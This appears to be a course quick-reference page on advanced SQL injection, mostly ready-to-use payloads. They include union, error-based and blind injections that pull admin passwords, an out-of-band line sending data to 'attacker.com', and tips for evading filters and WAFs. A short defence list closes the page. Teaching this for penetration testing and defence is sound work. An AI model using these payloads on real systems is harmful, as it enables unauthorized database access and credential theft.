---
title: Advance sql injection - Quick Reference
layout: layouts/course.njk
courseId: B5-sql-injection
tags:
  - reference
  - quick-guide
date: 2025-12-03T19:43:01.061629
---
# Advanced SQL Injection Quick Reference Guide

---

## Course Overview
**Duration:** 3-4 hours
**Level:** Advanced
**Topics:** Introduction, Core Concepts, Advanced Techniques, Best Practices, Summary

---

# 1. Key Concepts

- **SQL Injection (SQLi):** Exploiting unsanitized input to manipulate SQL queries.
- **Union-based SQLi:** Using `UNION` to combine results from malicious queries.
- **Error-based SQLi:** Leveraging database error messages to extract info.
- **Blind SQLi:** No direct output; infer data via true/false or time delays.
- **Boolean-based Blind SQLi:** Conditional queries returning different page content.
- **Time-based Blind SQLi:** Using delays (`SLEEP()`) to infer data.
- **Stored Procedures Exploitation:** Targeting procedural code in DBMS.
- **Out-of-Band (OOB) SQLi:** Data extraction via DNS or HTTP requests.
- **Second Order SQLi:** Injected payload stored and executed later.

---

# 2. Common Patterns & Syntax Examples

### Basic Injection
```sql
' OR '1'='1
' OR 1=1--
```

### Union-Based Injection
```sql
' UNION SELECT username, password FROM users--
```

### Error-Based Injection
```sql
' AND EXTRACTVALUE(NULL, CONCAT(0x3a, (SELECT database())))--
```

### Boolean-Based Blind Injection
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```

### Time-Based Blind Injection
```sql
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
```

### Out-of-Band Injection (MySQL example)
```sql
'; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\file'))--
```

---

# 3. Code Snippets

### Detect Number of Columns (Union Injection)
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- Increase until error occurs, max columns found just before error
```

### Find Injectable Columns
```sql
' UNION SELECT NULL, 'injected', NULL--
-- Replace NULL with test strings to identify injectable columns
```

### Extract DB Version (Error-Based)
```sql
' AND EXTRACTVALUE(NULL, CONCAT(0x3a, @@version))--
```

### Blind SQLi Character Extraction (Boolean-Based)
```sql
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 77--
```

### Time-Based Injection with Delay
```sql
' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(10), 0)--
```

---

# 4. Troubleshooting Quick Fixes

| Issue                       | Quick Fix / Tip                                     |
|-----------------------------|---------------------------------------------------|
| No visible error messages   | Try blind SQLi techniques (boolean/time-based)    |
| Queries filtered / sanitized | Use encoding (URL/hex), comment bypass (`--+`)   |
| Limited output length       | Extract data character-by-character (blind SQLi) |
| WAF blocking payloads       | Use obfuscation (case changes, comments)          |
| Multiple queries blocked    | Use stacked queries if allowed, else blind methods|
| Unexpected syntax errors    | Check for proper escaping and balanced quotes     |

---

# 5. Best Practices for Defense (Summary)

- Use **prepared statements** / parameterized queries.
- Apply **input validation** and **whitelisting**.
- Employ **least privilege** for database accounts.
- Regularly **patch** DBMS and application software.
- Implement **Web Application Firewalls (WAFs)** carefully.
- Conduct **code reviews** and **security testing** (including automated scans and manual pen tests).

---

**Keep this guide handy during coding and penetration testing for quick reference to advanced SQL injection techniques and defenses.**
